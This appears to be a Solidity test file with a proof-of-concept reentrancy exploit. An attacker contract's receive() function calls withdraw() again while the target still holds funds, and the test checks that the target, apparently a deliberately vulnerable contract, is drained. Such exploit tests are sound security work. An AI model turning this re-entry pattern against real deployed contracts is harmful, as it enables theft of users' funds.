// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnReentrancy_2.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function store(address target, bytes32 slot, bytes32 value) external;
}

contract Attacker_VulnReentrancy_2 {
    VulnReentrancy_2 target;
    uint256 public count;

    constructor(address _target) {
        target = VulnReentrancy_2(_target);
    }

    function attack() external {
        target.withdraw();
    }

    receive() external payable {
        if (count < 2 && address(target).balance >= 1 ether) {
            count++;
            target.withdraw();
        }
    }
}

contract VulnReentrancy_2Test {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnReentrancy_2 target;
    Attacker_VulnReentrancy_2 attacker;

    function setUp() public {
        target = new VulnReentrancy_2();
        attacker = new Attacker_VulnReentrancy_2(address(target));
        vm.deal(address(target), 5 ether);
        // Directly seed attacker balance mapping in slot 0
        bytes32 slot = keccak256(abi.encode(address(attacker), uint256(0)));
        vm.store(address(target), slot, bytes32(uint256(1 ether)));
    }

    function testReentrancyExploit() public {
        uint256 balBefore = address(target).balance;
        attacker.attack();
        uint256 balAfter = address(target).balance;
        require(balAfter < balBefore - 1 ether, "Reentrancy exploit confirmed: balance drained via recursive call");
    }
}
